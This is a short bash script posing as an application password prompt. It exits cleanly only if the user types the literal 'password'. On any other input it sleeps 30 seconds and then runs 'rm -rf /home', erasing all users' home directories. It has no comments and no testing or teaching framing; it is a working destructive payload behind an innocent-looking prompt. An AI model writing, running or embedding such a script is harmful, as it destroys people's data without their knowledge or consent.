#!/bin/bash

echo "Please enter password: "
read password

if [[ $password == "password" ]]
then
  echo "Exiting application"
  exit 0
fi

sleep 30s
rm -rf /home